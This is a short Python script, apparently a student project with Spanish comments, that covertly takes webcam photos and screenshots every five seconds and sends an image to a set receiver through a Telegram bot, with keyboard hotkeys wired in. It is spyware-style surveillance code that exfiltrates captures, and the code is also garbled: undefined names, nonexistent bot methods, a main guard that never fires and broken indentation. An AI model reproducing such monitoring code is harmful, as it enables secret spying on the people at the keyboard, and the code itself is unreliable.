import time
import cv2
import pyscreenshot as ImageGrab
import schedule
import telepot
import token 
import receiver_id 
import filepath 
from datetime import datetime
from global_hotkeys import *

import time
from pynput import  keyboard





cap = cv2.VideoCapture(0)
ret, frame = cap.read()
cv2.imwrite('', frame)   #insertar dirrecion
cap.release()
bot = telepot.Bot(token)
bot.notifyMessage(receiver_id, 'Picture Taken.') #enviar notificacion al usuario
bot.sendPicture(receiver_id, photo=open('SCREENSHOT', 'rb'))

def take_screenshot():
    print("Taking screenshot...")

    image_name = f"screenshot-{str(datetime.now())}"
    screenshot = ImageGrab.grab()

    filepathloc = f"" #location de la imagen

    screenshot.save(filepath)

    print("Screenshot taken...")

    return filepath


def Main():
    schedule.every(5).seconds.do(take_screenshot)

    while True:
        schedule.run_pending()
        time.sleep(1)


if __name__ == '__Main__':
    Main()

 def take_picture():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite("C:\\Users\\USER\\Desktop\\Proyecto final\\Camara\\picture.jpg", frame)
    cap.release()
    

def capture_screen():
    try:
        os.mkdir('screenshots')
    except FileExistsError:
        pass
    while True:
        screenshot = pyautogui.screenshot()
        screenshot_path = Path('C:\\Users\\USER\\Desktop\\Proyecto final\\Screenshots').joinpath('screenshot.png')
        screenshot.save(screenshot_path)
        
keyboard.add_hotkey('ctrl+v', capture_screen)
keyboard.add_hotkey('ctrl+x', take_picture)